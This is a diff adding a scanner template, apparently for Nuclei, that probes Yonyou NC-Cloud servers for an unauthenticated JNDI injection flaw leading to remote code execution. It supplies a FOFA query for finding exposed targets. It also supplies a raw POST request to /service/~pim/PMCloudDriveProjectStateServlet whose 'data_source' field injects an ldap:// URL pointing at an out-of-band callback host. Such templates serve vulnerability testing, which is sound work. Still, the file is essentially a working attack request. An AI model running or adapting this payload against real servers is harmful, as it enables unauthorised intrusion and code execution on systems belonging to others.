@@ -1,0 +1,29 @@
+id: yonyou-nc-cloud-pmclouddrive-jndi
+info:
+  name: "用友 NC-Cloud PMCloudDriveProjectStateServlet 接口 JNDI 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="用友-NC-Cloud"
+      用友NC-Cloud平台的PMCloudDriveProjectStateServlet.class接口存在JNDI注入缺陷。该漏洞影响NCC2105、NCC2111、YonBIP高级版2207及2305版本，攻击者可利用该接口中存在的JNDI注入缺陷，在未进行身份验证的情况下远程执行任意代码，进而控制目标服务器。
+  tags: 用友NC-Cloud
+http:
+- raw:
+  - |
+    POST /service/~pim/PMCloudDriveProjectStateServlet HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: close
+    Content-Type: application/json
+
+    {"data_source": "ldap://{{interactsh-url}}","user": ""}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
